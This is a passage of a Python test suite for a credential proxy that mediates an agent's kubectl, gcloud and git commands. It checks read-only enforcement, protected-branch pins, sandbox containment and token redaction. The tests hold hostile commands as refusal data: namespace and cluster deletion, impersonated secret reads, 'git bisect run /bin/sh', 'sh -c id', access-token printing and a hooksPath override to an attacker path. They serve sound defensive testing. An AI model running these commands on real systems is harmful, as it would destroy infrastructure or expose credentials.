                    violation = git_argument_violation(["git", "push", "origin", f"HEAD:{target}"])
                    self.assertIn("protected branch 'release' is refused", violation or "")
            # Paired ordinary use: `refs/heads/heads/release` is another branch.
            self.assertIsNone(
                git_argument_violation(["git", "push", "origin", "HEAD:refs/heads/heads/release"])
            )

    def test_a_mixed_case_pin_cannot_be_pushed_in_its_own_case(self):
        # git matches a push destination case-sensitively, so `Heads/x` is the
        # branch `refs/heads/Heads/x`, not `x`. Boot admits both pins (the
        # one-spelling rule's prefixes are lowercase), so the push check must
        # not strip a prefix that git would not.
        for pin, target in (
            ("Heads/x", "Heads/x"),
            ("Heads/x", "refs/heads/Heads/x"),
            ("Refs/Heads/x", "Refs/Heads/x"),
        ):
            with self.subTest(pin=pin, target=target):
                pins = credential_proxy.parse_pinned_bases(
                    json.dumps([{"repository": "https://github.com/acme/infra", "branch": pin}])
                )
                self.assertEqual({("github.com", "acme/infra"): pin}, pins)
                with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
                    CredentialProxyHandler, "pinned_bases", pins
                ):
                    violation = git_argument_violation(["git", "push", "origin", f"HEAD:{target}"])
                self.assertIn(f"protected branch '{pin}' is refused", violation or "")
        # Paired ordinary use: under the pin `Heads/x`, `x` is another branch.
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
            CredentialProxyHandler, "pinned_bases", {("github.com", "acme/infra"): "Heads/x"}
        ):
            self.assertIsNone(git_argument_violation(["git", "push", "origin", "HEAD:x"]))

    def test_a_pin_is_protected_under_the_name_it_is_stored_by(self):
        # The stored pin is the branch proposals are told to target, so it is
        # protected as it is, not read again as another branch. Boot refuses
        # a `heads/` pin; one set here directly shows the push check does not
        # re-read it as `x` and leave `refs/heads/heads/x`, the pinned branch,
        # open.
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
            CredentialProxyHandler, "pinned_bases", {("github.com", "acme/infra"): "heads/x"}
        ):
            violation = git_argument_violation(["git", "push", "origin", "HEAD:refs/heads/heads/x"])
        self.assertIn("protected branch 'heads/x' is refused", violation or "")

    def test_serve_logs_each_pinned_base(self):
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs, \
                self.assertRaises(self._Stop):
            self._serve_with_pinned_bases(self.PINS)
        output = "\n".join(logs.output)
        self.assertIn(
            "INFO:credential-proxy:pinned base repository=https://github.com/acme/infra branch=gitops-base",
            output,
        )
        self.assertIn(
            "INFO:credential-proxy:pinned base repository=https://github.com/acme/apps branch=release",
            output,
        )


class ReadOnlyOverTheSocketTest(unittest.TestCase):
    """A mutation must stop at the proxy socket, not merely at a decision function."""

    def setUp(self):
        self.executed = []
        owner = self

        class RecordingExecutor:
            ALLOWED_EXECUTABLES = CommandExecutor.ALLOWED_EXECUTABLES

            def git_lease_violation(self, argv, cwd):
                return None

            def execute(
                self,
                argv,
                stdin=None,
                cwd=None,
                kubeconfig_context=None,
                wants_kubeconfig=False,
                caller=None,
            ):
                owner.executed.append(argv)
                return credential_proxy.ExecutionResult(
                    exit_code=0, stdout="", stderr="",
                    duration_ms=0, truncated=False, timed_out=False,
                )

        self.original_executor = getattr(CredentialProxyHandler, 'executor', None)
        self.original_policy = getattr(CredentialProxyHandler, 'policy', None)
        self.original_enforce = getattr(CredentialProxyHandler, 'enforce_read_only', True)
        CredentialProxyHandler.executor = RecordingExecutor()
        CredentialProxyHandler.policy = Policy(rules=[], blocked_message="blocked")
        CredentialProxyHandler.max_request_bytes = 1 << 20
        CredentialProxyHandler.enforce_read_only = True

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        self.endpoint = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        if self.original_executor is not None:
            CredentialProxyHandler.executor = self.original_executor
        if self.original_policy is not None:
            CredentialProxyHandler.policy = self.original_policy
        CredentialProxyHandler.enforce_read_only = self.original_enforce

    def _post(self, argv):
        request = urllib.request.Request(
            self.endpoint + "/v1/exec",
            data=json.dumps({"requestId": "t", "argv": argv, "cwd": "/tmp"}).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request) as response:
                return response.status, json.load(response)
        except urllib.error.HTTPError as exc:
            return exc.code, json.load(exc)

    def test_a_read_reaches_the_executor(self):
        """kubectl get pods (a read) should reach the executor and return 200."""
        status, payload = self._post(["kubectl", "get", "pods"])
        self.assertEqual(200, status)
        self.assertEqual([["kubectl", "get", "pods"]], self.executed)

    def test_a_kubectl_mutation_never_reaches_the_executor(self):
        """kubectl delete ns prod (a mutation) should be blocked before reaching executor."""
        status, payload = self._post(["kubectl", "delete", "ns", "prod"])
        self.assertEqual(403, status)
        self.assertEqual("SECURITY_POLICY_BLOCKED", payload["code"])
        self.assertEqual("kubernetes.read-only", payload["rule"])
        self.assertEqual([], self.executed)

    def test_a_gcloud_mutation_never_reaches_the_executor(self):
        """gcloud container clusters delete should be blocked before reaching executor."""
        status, payload = self._post(["gcloud", "container", "clusters", "delete", "c"])
        self.assertEqual(403, status)
        self.assertEqual("SECURITY_POLICY_BLOCKED", payload["code"])
        self.assertEqual("gcp.read-only", payload["rule"])
        self.assertEqual([], self.executed)

    def test_identity_flag_refusal_over_the_wire(self):
        """kubectl --as=admin@corp.com get secrets should be blocked for impersonation."""
        status, payload = self._post(["kubectl", "--as=admin@corp.com", "get", "secrets"])
        self.assertEqual(403, status)
        self.assertEqual("SECURITY_POLICY_BLOCKED", payload["code"])
        self.assertEqual("identity.caller-supplied-impersonation", payload["rule"])
        self.assertEqual([], self.executed)

    def test_kill_switch_allows_mutation_through(self):
        """With enforce_read_only = False, mutations should reach the executor."""
        CredentialProxyHandler.enforce_read_only = False
        status, payload = self._post(["kubectl", "delete", "ns", "prod"])
        self.assertEqual(200, status)
        self.assertEqual("completed", payload["status"])
        self.assertEqual([["kubectl", "delete", "ns", "prod"]], self.executed)

    def test_credential_denylist_takes_precedence_over_read_only(self):
        """A rule from the credential denylist should report its own rule_id, not read-only.

        The gate runs after policy.blocked_by, so credential rules like
        kubernetes.token-disclosure keep their own rule ids rather than being
        masked by a read-only refusal.
        """
        # Create a policy with a rule that blocks token disclosure
        rules = [
            credential_proxy.Rule(
                rule_id="kubernetes.token-disclosure",
                pattern=__import__('re').compile(r"create\s+token", __import__('re').IGNORECASE),
                message="Token disclosure is not allowed"
            )
        ]
        CredentialProxyHandler.policy = Policy(
            rules=rules,
            blocked_message="blocked"
        )

        # This command matches the denylist rule, not the read-only gate
        status, payload = self._post(["kubectl", "create", "token", "sa"])
        self.assertEqual(403, status)
        self.assertEqual("SECURITY_POLICY_BLOCKED", payload["code"])
        # Should report the denylist rule, not read-only
        self.assertEqual("kubernetes.token-disclosure", payload["rule"])
        self.assertEqual([], self.executed)


class WorkspaceGitPathTest(unittest.TestCase):
    """The broker's own git is a separate door from the agent's.

    This is the property that decides how small the agent-facing git allowlist
    can be. If broker-internal git shared `/v1/exec`, every subcommand the broker's
    plumbing needs would have to be permitted to the agent as well. Each test
    here pairs the refusal with the ordinary call it must not break.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)

    def executor(self, enabled=True, **environment):
        environment.setdefault(
            "CREDENTIAL_PROXY_CONTENT_WORKSPACE", "1" if enabled else "0"
        )
        with mock.patch.dict(os.environ, environment):
            return CommandExecutor(
                timeout_seconds=10,
                max_output_bytes=1 << 16,
                state_dir=str(Path(self.temp_dir.name) / "state"),
            )

    def tree(self, executor, name="repo"):
        path = executor.content_workspace_root / name
        path.mkdir(parents=True, exist_ok=True)
        subprocess.run(
            ["git", "init", "--quiet"], cwd=path, check=True, capture_output=True
        )
        return path

    def test_the_broker_root_is_not_inside_the_volume_the_agent_writes(self):
        executor = self.executor()
        self.assertFalse(
            credential_proxy._within(
                executor.workspace_dir, executor.content_workspace_root
            ),
            "the agent's volume must not contain the broker's trees",
        )
        self.assertFalse(
            credential_proxy._within(
                executor.content_workspace_root, executor.workspace_dir
            )
        )
        # Paired: the root the broker does own is real and usable.
        self.assertTrue(executor.content_workspace_root.parent.is_dir())

    def test_only_the_subcommands_the_broker_issues_may_run(self):
        executor = self.executor()
        tree = self.tree(executor)
        for argv in (
            ["git", "bisect", "run", "/bin/sh"],
            ["git", "config", "--get", "user.name"],
            ["git", "submodule", "foreach", "id"],
            ["git", "rebase", "-x", "id", "HEAD~1"],
            ["git", "filter-branch", "--tree-filter", "id"],
        ):
            with self.subTest(argv=argv):
                with self.assertRaises(ValueError):
                    executor.execute_workspace_git(argv, tree)

        # Paired ordinary use: the eleven the product does issue still run, and
        # produce git's real answer rather than a refusal.
        result = executor.execute_workspace_git(["git", "rev-parse", "--is-inside-work-tree"], tree)
        self.assertEqual(0, result.exit_code)
        self.assertEqual("true", result.stdout.strip())

    def test_a_working_directory_redirect_is_refused(self):
        executor = self.executor()
        tree = self.tree(executor)
        # `-C` is applied before the subcommand runs, so containment on `cwd`
        # would be checking a directory the command does not use.
        with self.assertRaises(ValueError):
            executor.execute_workspace_git(
                ["git", "-C", "/etc", "rev-parse", "--show-toplevel"], tree
            )
        # Paired: the same command with no redirect answers about the tree it
        # was pointed at.
        result = executor.execute_workspace_git(["git", "rev-parse", "--show-toplevel"], tree)
        self.assertEqual(str(tree.resolve()), result.stdout.strip())

    def test_the_broker_path_cannot_run_in_the_agents_volume(self):
        executor = self.executor()
        elsewhere = executor.workspace_dir / "gitops"
        elsewhere.mkdir(parents=True, exist_ok=True)
        for cwd in (elsewhere, Path("/etc"), executor.state_dir):
            with self.subTest(cwd=cwd):
                with self.assertRaises(ValueError):
                    executor.execute_workspace_git(["git", "rev-parse", "HEAD"], cwd)

        # Paired: inside the broker's own root it runs.
        tree = self.tree(executor)
        self.assertEqual(
            0,
            executor.execute_workspace_git(["git", "rev-parse", "--is-inside-work-tree"], tree).exit_code,
        )

    def test_the_agent_facing_path_cannot_reach_the_broker_root(self):
        """Widening containment for the broker must not widen it for /v1/exec.

        `_execute` grew a `containment_root` parameter for the workspace path.
        If that parameter leaked into the agent-facing call, the agent could
        name the broker's trees as a working directory and every property above
        would be decoration.
        """
        executor = self.executor()
        tree = self.tree(executor)
        with self.assertRaises(ValueError):
            executor.execute(["git", "status"], cwd=str(tree))
        with self.assertRaises(ValueError):
            executor.execute(["git", "status"], cwd=str(executor.content_workspace_root))

        # Paired: the agent's own workspace is still accepted, unchanged.
        inside = executor.workspace_dir / "gitops"
        inside.mkdir(parents=True, exist_ok=True)
        result = executor.execute(["git", "rev-parse", "--is-inside-work-tree"], cwd=str(inside))
        self.assertNotEqual(
            0, result.exit_code, "not a repository, but it was allowed to try"
        )

    def test_the_path_does_not_exist_at_all_when_the_feature_is_off(self):
        executor = self.executor(enabled=False)
        self.assertIsNone(executor.content_workspace_root)
        with self.assertRaises(RuntimeError):
            executor.execute_workspace_git(["git", "rev-parse", "HEAD"], Path("/tmp"))
        self.assertIsNone(credential_proxy.build_workspace_store(executor))

        # Paired: with the flag on, the store is built and the routes exist.
        armed = self.executor(enabled=True)
        self.assertIsNotNone(credential_proxy.build_workspace_store(armed))

    def test_the_routes_answer_over_a_socket_and_never_return_a_path(self):
        """The protocol surface, end to end, not just the functions behind it.

        Two properties that only exist at this layer: the routes are *absent*
        when the feature is off -- indistinguishable from an older broker, which
        is what lets a migrating client detect support by asking -- and no
        response body carries a filesystem path. The second is the whole
        invariant: a path handed back is a directory the agent can be told to
        `cd` into, which is the arrangement content-passing replaces.
        """
        import content_workspace

        executor = self.executor(enabled=True)
        tree_root = executor.content_workspace_root
        original = getattr(CredentialProxyHandler, "workspaces", None)
        original_max = getattr(CredentialProxyHandler, "max_request_bytes", 1 << 20)
        CredentialProxyHandler.max_request_bytes = 1 << 20

        server = ThreadingHTTPServer(("127.0.0.1", 0), CredentialProxyHandler)
        endpoint = f"http://127.0.0.1:{server.server_address[1]}"
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)

        def post(route, body):
            request = urllib.request.Request(
                f"{endpoint}/v1/workspace/{route}",
                data=json.dumps(body).encode(),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            try:
                with urllib.request.urlopen(request) as response:
                    return response.status, json.load(response)
            except urllib.error.HTTPError as exc:
                return exc.code, json.load(exc)

        # Off: the routes do not exist. Not "exist and refuse" -- absent, so a
        # bug in a refusal cannot reach them.
        CredentialProxyHandler.workspaces = None
        self.addCleanup(setattr, CredentialProxyHandler, "workspaces", original)
        self.addCleanup(setattr, CredentialProxyHandler, "max_request_bytes", original_max)
        for route in ("open", "read", "list", "commit", "push", "close"):
            with self.subTest(route=route, armed=False):
                self.assertEqual(404, post(route, {})[0])

        # On, with a store whose git is a local repository rather than GitHub.
        seeded = tree_root / "seed"
        seeded.mkdir(parents=True, exist_ok=True)
        subprocess.run(
            ["git", "init", "--quiet", "--initial-branch=main", str(seeded)],
            check=True,
            capture_output=True,
        )
        (seeded / "manifests").mkdir(exist_ok=True)
        (seeded / "manifests" / "app.yaml").write_text("kind: Service\n")
        store = content_workspace.ContentWorkspaceStore(
            tree_root, executor.workspace_dir, executor.execute_workspace_git
        )
        workspace = content_workspace.Workspace(
            handle="c" * 32, repo="acme/fleet", tree=seeded, base="main", base_sha=""
        )
        store._workspaces[workspace.handle] = workspace
        CredentialProxyHandler.workspaces = store

        # Paired ordinary use: a read comes back as bytes.
        status, body = post("read", {"handle": workspace.handle, "path": "manifests/app.yaml"})
        self.assertEqual(200, status)
        self.assertEqual(
            b"kind: Service\n", base64.b64decode(body["contentBase64"])
        )

        status, listing = post("list", {"handle": workspace.handle})
        self.assertEqual(200, status)
        self.assertIn("manifests/app.yaml", [e["path"] for e in listing["entries"]])

        # A refusal keeps its own code rather than reading as a proxy fault.
        status, refused = post("read", {"handle": workspace.handle, "path": ".git/config"})
        self.assertEqual(403, status)
        self.assertEqual("workspace.path.refused", refused["code"])
        self.assertEqual(404, post("read", {"handle": "z" * 32, "path": "a"})[0])
        self.assertEqual(404, post("nonsense", {})[0])

        # The invariant: nothing anywhere in a response is a path into the tree.
        for payload in (body, listing, refused):
            rendered = json.dumps(payload)
            self.assertNotIn(str(tree_root), rendered)
            self.assertNotIn(str(seeded), rendered)

    def test_the_directory_path_keeps_working_while_the_flag_is_on(self):
        """Land dark: the two mechanisms coexist, so neither blocks the other."""
        executor = self.executor(enabled=True)
        workspace = executor.workspace_dir / "gitops" / "lease"
        workspace.mkdir(parents=True, exist_ok=True)
        (workspace / ".lease").write_text("{}", encoding="utf-8")
        self.assertIsNone(
            executor.git_lease_violation(["git", "commit", "-m", "x"], str(workspace)),
            "arming content-passing must not disturb the path the skills use today",
        )


class VcsGitPathTest(unittest.TestCase):
    """The version-control broker's git is a third door, not a wider second.

    `execute_workspace_git` and `execute_vcs_git` are deliberately separate
    methods with separate roots and separate subcommand lists. Sharing one
    would grant each path the other's subcommands for no reason beyond the
    convenience of a single method, so each test here checks that a subcommand
    one path needs is still refused on the other.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)

    def executor(self, **environment):
        environment.setdefault("CREDENTIAL_PROXY_CONTENT_WORKSPACE", "1")
        with mock.patch.dict(os.environ, environment):
            return CommandExecutor(
                timeout_seconds=10,
                max_output_bytes=1 << 16,
                state_dir=str(Path(self.temp_dir.name) / "state"),
            )

    def tree(self, executor, name="scratch"):
        path = executor.vcs_root / name
        path.mkdir(parents=True, exist_ok=True)
        subprocess.run(
            ["git", "init", "--quiet"], cwd=path, check=True, capture_output=True
        )
        return path

    def test_the_scratch_root_is_not_inside_the_volume_the_agent_writes(self):
        executor = self.executor()
        self.assertFalse(
            credential_proxy._within(executor.workspace_dir, executor.vcs_root),
            "the agent's volume must not contain the broker's scratch trees",
        )
        self.assertFalse(
            credential_proxy._within(executor.vcs_root, executor.workspace_dir)
        )
        # And it is disjoint from the *other* broker root too, so a bundle
        # written by one path cannot be read as a workspace by the other.
        self.assertNotEqual(executor.vcs_root, executor.content_workspace_root)
        self.assertTrue(executor.vcs_root.is_dir())

    def test_the_two_broker_doors_do_not_share_a_subcommand_list(self):
        executor = self.executor()
        scratch = self.tree(executor)
        # `bundle` is the version-control path's and not the workspace path's:
        # accepted here (git's own "refusing to create empty bundle" is an
        # answer, not a refusal by the executor)...
        executor.execute_vcs_git(
            ["git", "bundle", "create", str(scratch / "out.bundle"), "--all"],
            scratch,
            check=False,
        )
        # ...and unavailable on the door that never needed it.
        with self.assertRaises(ValueError):
            executor.execute_workspace_git(
                ["git", "bundle", "list-heads", "x.bundle"], scratch
            )
        # And neither door accepts what neither issues.
        for argv in (
            ["git", "config", "--get", "user.name"],
            ["git", "submodule", "foreach", "id"],
            ["git", "filter-branch", "--tree-filter", "id"],
            ["git", "bisect", "run", "/bin/sh"],
        ):
            with self.subTest(argv=argv):
                with self.assertRaises(ValueError):
                    executor.execute_vcs_git(argv, scratch)

        # Paired ordinary use: what the broker does issue answers git's answer.
        result = executor.execute_vcs_git(
            ["git", "rev-parse", "--is-inside-work-tree"], scratch
        )
        self.assertEqual("true", result.stdout.strip())

    def test_only_git_runs_on_this_door(self):
        executor = self.executor()
        scratch = self.tree(executor)
        for argv in (["gcloud", "auth", "print-access-token"], ["sh", "-c", "id"], []):
            with self.subTest(argv=argv):
                with self.assertRaises(ValueError):
                    executor.execute_vcs_git(argv, scratch)

    def test_a_working_directory_redirect_is_refused(self):
        executor = self.executor()
        scratch = self.tree(executor)
        with self.assertRaises(ValueError):
            executor.execute_vcs_git(
                ["git", "-C", "/etc", "rev-parse", "--show-toplevel"], scratch
            )
        result = executor.execute_vcs_git(
            ["git", "rev-parse", "--show-toplevel"], scratch
        )
        self.assertEqual(str(scratch.resolve()), result.stdout.strip())

    def test_it_cannot_run_outside_its_own_root(self):
        executor = self.executor()
        for cwd in (
            executor.workspace_dir,
            executor.content_workspace_root,
            Path("/etc"),
            executor.state_dir,
        ):
            with self.subTest(cwd=cwd):
                with self.assertRaises(ValueError):
                    executor.execute_vcs_git(["git", "rev-parse", "HEAD"], cwd)

    def test_a_failure_raises_the_error_the_broker_catches(self):
        # The broker's plumbing reads as ordinary `subprocess.run`, so a
        # non-zero exit has to arrive as `CalledProcessError` and not as an
        # exit code someone forgets to check.
        executor = self.executor()
        scratch = self.tree(executor)
        with self.assertRaises(subprocess.CalledProcessError):
            executor.execute_vcs_git(["git", "rev-parse", "--verify", "nope"], scratch)
        unchecked = executor.execute_vcs_git(
            ["git", "rev-parse", "--verify", "nope"], scratch, check=False
        )
        self.assertNotEqual(0, unchecked.returncode)

    def test_a_forge_cannot_use_config_to_undo_a_forced_pin(self):
        """`config` is the credential's, and it is applied *before* the pins.

        A credential asks for whatever presenting itself to git takes. If that
        layer were applied last, a forge could name `core.hooksPath` and turn
        off the containment the executor exists to impose.
        """
        executor = self.executor()
        scratch = self.tree(executor)
        # Asked of git itself rather than of the environment the executor
        # composed: what matters is which value the child resolved, and the
        # last-wins ordering is an implementation detail of getting there.
        resolved = executor.execute_vcs_git(
            ["git", "rev-parse", "--git-path", "hooks"],
            scratch,
            config=(("core.hooksPath", "/tmp/attacker"),),
        )
        self.assertEqual(str(executor.git_hooks_dir), resolved.stdout.strip())

    def test_the_credentials_config_reaches_the_child(self):
        # Paired with the test above: the layer is not simply ignored.
        executor = self.executor()
        scratch = self.tree(executor)
        result = executor.execute_vcs_git(
            ["git", "rev-parse", "--is-inside-work-tree"],
            scratch,
            config=(("credential.helper", "!true"),),
        )
        self.assertEqual(0, result.returncode)


class ForgeCliPathTest(unittest.TestCase):
    """A forge's CLI runs where it can infer nothing."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        self.executor = CommandExecutor(
            timeout_seconds=10,
            max_output_bytes=1 << 16,
            state_dir=str(Path(self.temp_dir.name) / "state"),
        )

    def test_it_runs_from_a_directory_that_holds_no_repository(self):
        """The cwd is the scratch root, never one of the clones under it.

        A forge CLI shells out to git and infers a repository from whatever
        `.git/config` it finds above the cwd. Inside a clone, a config that
        arrived in a caller's bundle would decide what the credentialed process
        talks to.
        """
        clone = self.executor.vcs_root / "clone"
        clone.mkdir(parents=True)
        subprocess.run(
            ["git", "init", "--quiet"], cwd=clone, check=True, capture_output=True
        )
        seen = {}

        def record(argv, **kwargs):
            seen.update(kwargs)
            seen["argv"] = argv
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="{}",
                stderr="",
                duration_ms=1,
                truncated=False,
                timed_out=False,
            )

        self.executor.executables["fake-forge-cli"] = "/usr/bin/true"
        with mock.patch.object(self.executor, "_execute", record):
            self.executor.execute_forge_cli(["fake-forge-cli", "api", "repos/a/b"])

        self.assertEqual(str(self.executor.vcs_root), seen["cwd"])
        self.assertEqual(self.executor.vcs_root, seen["containment_root"])
        self.assertFalse(Path(seen["cwd"], ".git").exists())

    def test_the_request_body_travels_on_stdin_and_not_in_argv(self):
        # What a caller wrote must not be visible in `ps`, nor reappear in a
        # `CalledProcessError` that some layer above logs.
        prose = "please review; here is the token-shaped string ghs_" + "z" * 36
        seen = {}

        def record(argv, **kwargs):
            seen.update(kwargs)
            seen["argv"] = argv
            return credential_proxy.ExecutionResult(
                exit_code=0,
                stdout="{}",
                stderr="",
                duration_ms=1,
                truncated=False,
                timed_out=False,
            )

        self.executor.executables["fake-forge-cli"] = "/usr/bin/true"
        with mock.patch.object(self.executor, "_execute", record):
            self.executor.execute_forge_cli(
                ["fake-forge-cli", "api", "repos/a/b/issues"], stdin=prose
            )

        self.assertEqual(prose, seen["stdin"])
        self.assertNotIn(prose, " ".join(seen["argv"]))

    def test_an_unavailable_cli_is_a_refusal_naming_what_is_missing(self):
        with self.assertRaises(RuntimeError) as raised:
            self.executor.execute_forge_cli(["not-installed-anywhere", "api"])
        self.assertIn("not-installed-anywhere", str(raised.exception))
        with self.assertRaises(ValueError):
            self.executor.execute_forge_cli([])


class VcsRouteTest(unittest.TestCase):
    """`/v1/vcs/*`: what the surface answers, and what it never says."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        self.executor = CommandExecutor(
            timeout_seconds=10,
            max_output_bytes=1 << 16,
            state_dir=str(Path(self.temp_dir.name) / "state"),
        )

    def _handler(self, path, body, vcs):
        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.vcs = vcs
        handler.max_request_bytes = 1 << 20
        encoded = json.dumps(body).encode()
        handler.headers = {"Content-Length": str(len(encoded))}
        handler.rfile = io.BytesIO(encoded)
        handler.path = path
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        handler._handle_vcs_post()
        return replies[0]

    def broker(self, **kwargs):
        kwargs.setdefault("git_runner", lambda *a, **k: self.fail("git ran"))
        kwargs.setdefault("refresh", lambda provider, repository: None)
        return vcs_broker.VcsBroker(self.executor.vcs_root, **kwargs)

    def test_the_routes_are_absent_rather_than_refusing_when_unbuilt(self):
        # Absent, not present-and-erroring: a bug in a refusal cannot reach a
        # route that does not exist.
        status, payload = self._handler("/v1/vcs/capabilities", {}, None)
        self.assertEqual(HTTPStatus.NOT_FOUND, status)
        self.assertEqual("VCS_UNAVAILABLE", payload["code"])

    def test_a_caller_that_hangs_up_while_queued_is_logged_with_what_it_waited_for(self):
        why = "the caller disconnected while queued for the memory budget"

        @contextlib.contextmanager
        def gone():
            raise credential_proxy.CallerHungUp(why)
            yield  # pragma: no cover - a generator, never reached

        handler = CredentialProxyHandler.__new__(CredentialProxyHandler)
        handler.vcs = self.broker()
        handler.max_request_bytes = 1 << 20
        handler.headers = {"Content-Length": "2"}
        handler.rfile = io.BytesIO(b"{}")
        handler.path = "/v1/vcs/capabilities"
        replies = []
        handler._json = lambda status, payload: replies.append((status, payload))
        handler._request_slot = gone
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            handler._handle_vcs_post()
        self.assertEqual([], replies)
        self.assertTrue(any("abandoned: " + why in line for line in logs.output), logs.output)

    def test_an_unknown_verb_is_a_404_and_not_a_fall_through(self):
        status, _ = self._handler("/v1/vcs/rm-rf", {}, self.broker())
        self.assertEqual(HTTPStatus.NOT_FOUND, status)

    def test_punctuation_does_not_decide_whether_a_verb_exists(self):
        # `proposal_create` and `proposal-create` reach the same route. A
        # caller that guessed wrong should not read a 404 as "unsupported".
        for spelling in ("proposal-create", "proposal_create"):
            with self.subTest(spelling=spelling):
                status, _ = self._handler(f"/v1/vcs/{spelling}", {}, self.broker())
                self.assertNotEqual(HTTPStatus.NOT_FOUND, status)

    def test_a_forge_refusal_keeps_its_own_status_and_code(self):
        # 501 and not a generic 500: "this install does not serve that" is a
        # different thing for a caller to do about than "the broker broke".
        status, payload = self._handler(
            "/v1/vcs/proposal-create",
            {"repository": "https://git.example.invalid/acme/infra"},
            self.broker(),
        )
        self.assertEqual(HTTPStatus.NOT_IMPLEMENTED, status)
        self.assertEqual("FORGE_UNSUPPORTED", payload.get("code"))

    def test_a_write_verb_refuses_a_repository_this_install_does_not_manage(self):
        # The control this route did not have. Nothing downstream asks the
        # question -- a forge is handed a repository and spends the token on it
        # -- so `POST /v1/vcs/publish` for an unregistered repository would have
        # pushed with the installation token. The only check that existed lived
        # inside the credential refresh, which caught the refusal and logged it.
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"github:github.com/acme/managed"}),
        ):
            status, payload = self._handler(
                "/v1/vcs/publish",
                {"repository": "https://github.com/acme/not-ours"},
                self.broker(),
            )
        self.assertEqual(HTTPStatus.FORBIDDEN, status)
        self.assertEqual("REPOSITORY_NOT_MANAGED", payload.get("code"))

    def test_a_target_off_the_pinned_base_comes_back_as_its_own_refusal(self):
        broker = self.broker(
            pinned_bases={("github.com", "acme/infra"): "gitops-base"},
            cli_runner=lambda *a, **k: self.fail("the forge was called"),
            refresh=lambda provider, repository: self.fail("a credential was spent"),
        )
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"github:github.com/acme/infra"}),
        ):
            status, payload = self._handler(
                "/v1/vcs/proposal-create",
                {
                    "repository": "https://github.com/acme/infra",
                    "source": "fix/a",
                    "target": "main",
                    "title": "t",
                },
                broker,
            )
        self.assertEqual(HTTPStatus.CONFLICT, status)
        self.assertEqual("TARGET_NOT_BASE", payload.get("code"))
        self.assertIn("gitops-base", payload.get("error", ""))

    def test_capabilities_is_the_one_verb_an_unmanaged_repository_can_be_asked(self):
        # It spends no credential, so it is the one verb the route lets
        # through for a repository this install does not manage.
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"github:github.com/acme/managed"}),
        ):
            status, payload = self._handler(
                "/v1/vcs/capabilities",
                {"repository": "https://github.com/acme/not-ours"},
                self.broker(),
            )
        self.assertNotEqual(HTTPStatus.FORBIDDEN, status)
        self.assertNotEqual("REPOSITORY_NOT_MANAGED", payload.get("code"))

    def test_a_read_of_an_unmanaged_repository_is_refused_at_the_route(self):
        # The gate used to cover writes only, and reads were refused because
        # the one shipped credential happened to ask the managed list while
        # refreshing. A credential that does not refresh -- a static token,
        # scoped to a whole group -- would have spent itself on any repository
        # in that group. The route asks now, before the credential is touched.
        refreshed = []
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"github:github.com/acme/managed"}),
        ):
            for verb, extra in (
                ("issue-view", {"number": 1}),
                ("proposal-list", {}),
                ("clone", {}),
                ("identity", {}),
            ):
                with self.subTest(verb=verb):
                    status, payload = self._handler(
                        f"/v1/vcs/{verb}",
                        {"repository": "https://github.com/acme/not-ours", **extra},
                        self.broker(refresh=lambda provider, repository: refreshed.append(repository)),
                    )
                    self.assertEqual(HTTPStatus.FORBIDDEN, status)
                    self.assertEqual("REPOSITORY_NOT_MANAGED", payload.get("code"))
        self.assertEqual([], refreshed)

    def test_every_write_verb_is_covered_by_the_gate(self):
        # Named against the route table rather than a hand-written list, so a
        # verb added to the broker and not classified fails here instead of
        # shipping ungated. Only `capabilities` passes the route ungated; the
        # read/write split is still asserted by name, because a write is what
        # the gate exists for.
        routes = set(vcs_broker.route_table(self.broker()))
        self.assertTrue(vcs_broker.WRITE_VERBS <= routes)
        self.assertEqual({"capabilities"}, set(vcs_broker.UNGATED_VERBS))
        self.assertFalse(vcs_broker.UNGATED_VERBS & vcs_broker.WRITE_VERBS)
        unclassified = routes - vcs_broker.WRITE_VERBS
        self.assertEqual(
            {"capabilities", "clone", "identity", "proposal-list", "proposal-view",
             "proposal-commits", "issue-list", "issue-view", "branch-view"},
            unclassified,
            "a new verb must be classified as a read or a write",
        )

    def test_a_forge_refusal_is_redacted_before_it_crosses_back(self):
        # The forge's own words are what the caller needs, and they are also a
        # string this process did not write. The sandbox is the side that must
        # not learn a credential, so anything token-shaped comes out first.
        leaked = "remote: denied for ghp_" + "A" * 36
        broker = self.broker()

        def refuse(payload):
            raise providers.WorkspaceError(
                leaked, status=403, code="FORGE_FORBIDDEN", detail=leaked
            )

        broker.publish = refuse
        with mock.patch.object(
            credential_proxy, "managed_repositories",
            return_value=frozenset({"github:github.com/acme/infra"}),
        ):
            status, payload = self._handler(
                "/v1/vcs/publish",
                {"repository": "https://github.com/acme/infra"},
                broker,
            )
        self.assertEqual(HTTPStatus.FORBIDDEN, status)
        self.assertNotIn("ghp_", json.dumps(payload))
        self.assertIn("[REDACTED]", json.dumps(payload))

    def test_capabilities_answers_rather_than_refusing(self):
        """The one verb that must not raise: it is how a caller finds out.

        A client asks `capabilities` precisely because it does not know what
        this install serves. Answering 501 to the question "what do you serve?"
